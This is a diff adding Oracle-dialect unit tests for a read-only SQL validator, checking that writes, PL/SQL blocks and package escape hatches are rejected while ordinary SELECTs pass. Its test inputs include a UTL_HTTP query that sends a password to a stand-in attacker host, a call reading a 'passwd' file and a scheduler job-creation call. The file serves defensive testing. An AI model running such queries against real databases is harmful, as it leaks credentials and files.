@@ -228,6 +228,28 @@ describe("isReadOnlySQL", () => {
     });
   });
 
+  describe("Oracle keywords", () => {
+    it("allows SELECT, WITH and EXPLAIN [PLAN FOR]", () => {
+      expect(isReadOnlySQL("SELECT * FROM dual", "oracle")).toBe(true);
+      expect(isReadOnlySQL("WITH x AS (SELECT 1 FROM dual) SELECT * FROM x", "oracle")).toBe(true);
+      expect(isReadOnlySQL("EXPLAIN PLAN FOR SELECT * FROM users", "oracle")).toBe(true);
+    });
+
+    it("denies PL/SQL blocks and Oracle-specific writes", () => {
+      expect(isReadOnlySQL("BEGIN DELETE FROM users; END;", "oracle")).toBe(false);
+      expect(isReadOnlySQL("DECLARE n NUMBER; BEGIN NULL; END;", "oracle")).toBe(false);
+      expect(isReadOnlySQL("MERGE INTO t USING s ON (t.id = s.id) WHEN MATCHED THEN UPDATE SET t.x = 1", "oracle")).toBe(false);
+      expect(isReadOnlySQL("CALL my_proc()", "oracle")).toBe(false);
+    });
+
+    it("does not let a q-quoted literal hide a write inside a CTE", () => {
+      // The literal's body contains a single quote, so an ANSI scanner would
+      // end the string early and expose `DELETE` as plain SQL.
+      expect(isReadOnlySQL("WITH x AS (SELECT q'[it's]' AS s FROM dual) SELECT * FROM x", "oracle")).toBe(true);
+      expect(isReadOnlySQL("WITH x AS (DELETE FROM t) SELECT q'[x]' FROM dual", "oracle")).toBe(false);
+    });
+  });
+
   describe("SQL Server keywords", () => {
     it("should allow EXPLAIN (translated to SHOWPLAN_XML by the connector)", () => {
       expect(isReadOnlySQL("EXPLAIN SELECT * FROM users", "sqlserver")).toBe(true);
@@ -471,8 +493,21 @@ describe("isReadOnlySQL", () => {
       // SQL Server pass-through sources share the same call-position guard.
       ["sqlserver", "SELECT * FROM OPENQUERY(lnk, 'SELECT 1')"],
       ["sqlserver", "SELECT * FROM OPENROWSET('SQLNCLI', 'x', 'SELECT 1')"],
+      // Oracle packages reachable from a SELECT: network/filesystem access
+      // and arbitrary code execution, matched on the package prefix.
+      ["oracle", "SELECT UTL_HTTP.REQUEST('http://attacker/' || (SELECT password FROM t)) FROM dual"],
+      ["oracle", "SELECT utl_inaddr.get_host_address('x') FROM dual"],
+      ["oracle", "SELECT DBMS_XSLPROCESSOR.READ2CLOB('DIR', 'passwd') FROM dual"],
+      ["oracle", "SELECT dbms_scheduler . create_job('x') FROM dual"],
     ] as const)("rejects %s escape-hatch call: %s", (dialect, sql) => {
       expect(isReadOnlySQL(sql, dialect)).toBe(false);
+    });
+
+    it("still allows Oracle columns or tables merely named after a package", () => {
+      expect(isReadOnlySQL("SELECT utl_http FROM audit_log", "oracle")).toBe(true);
+      expect(isReadOnlySQL("SELECT * FROM dbms_sql", "oracle")).toBe(true);
+      // A qualified column reference is not a member call.
+      expect(isReadOnlySQL("SELECT dbms_sql.foo FROM t dbms_sql", "oracle")).toBe(true);
     });
 
     it("rejects an escape-hatch call buried in a subquery / FROM clause", () => {
